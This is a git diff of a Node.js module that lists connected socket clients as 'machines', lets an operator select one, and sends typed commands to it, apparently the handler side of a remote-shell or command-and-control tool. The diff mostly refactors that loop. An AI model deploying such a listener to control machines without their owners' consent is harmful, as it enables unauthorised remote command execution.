@@ -10,34 +10,53 @@ const rl = readline.createInterface({
 });
 
 const util = {
+    getClientConnection : (client) => {
+        try {
+            for (let i = 0; i < socketClients.length; i++) {
+                if (socketClients[i].address === client.remoteAddress + ":" + client.remotePort) {
+                    return socketClients[i];
+                }
+            }
+        } catch {
+            console.error("Could not find client.");
+            return false;
+        }
+    },
+    
     getClientCount : async (server) => {
         await server.getConnections((err, count) => {
             if(err) return err;
             else {
-                console.log(`There are ${count} connection(s) now.`);
                 updateDashboardClientCount(count);
             }
         });
     },
 
-    takeAndSendCommand : (socket) => {
-        rl.question(`${socket.remoteAddress}) # `, (cmd) => {
-            if (cmd === "clients") {
-                this.getClientCount(server);
-            } else {
-                socket.write(cmd + "\r\n");
-            }
-        });    
-    },
-
     mainMenu : () => {
+        console.log("Available machines:");
         for (let i = 0; i < socketClients.length; i++) {
             console.log(`${i}) ${socketClients[i].address}`)
         }
-        rl.question("Select client:\n", (cmd) => {
-            util.takeAndSendCommand(socketClients[cmd].client)
-        })
-    }
+        rl.question("$ ", (cmd) => {
+            try {
+                util.takeAndSendCommand(socketClients[cmd].client);
+            } catch {
+                console.error("Unable to switch to client:",cmd);
+                util.mainMenu();
+            }
+        });
+    },
+
+    takeAndSendCommand : (socket) => {
+        const currentClient = util.getClientConnection(socket);
+        rl.question(`${currentClient.name} # `, (cmd) => {
+            if (cmd === "menu") {
+                util.mainMenu();
+            } else {
+                socket.write(cmd);
+            }
+        });    
+    },
 };
 
 module.exports = util;
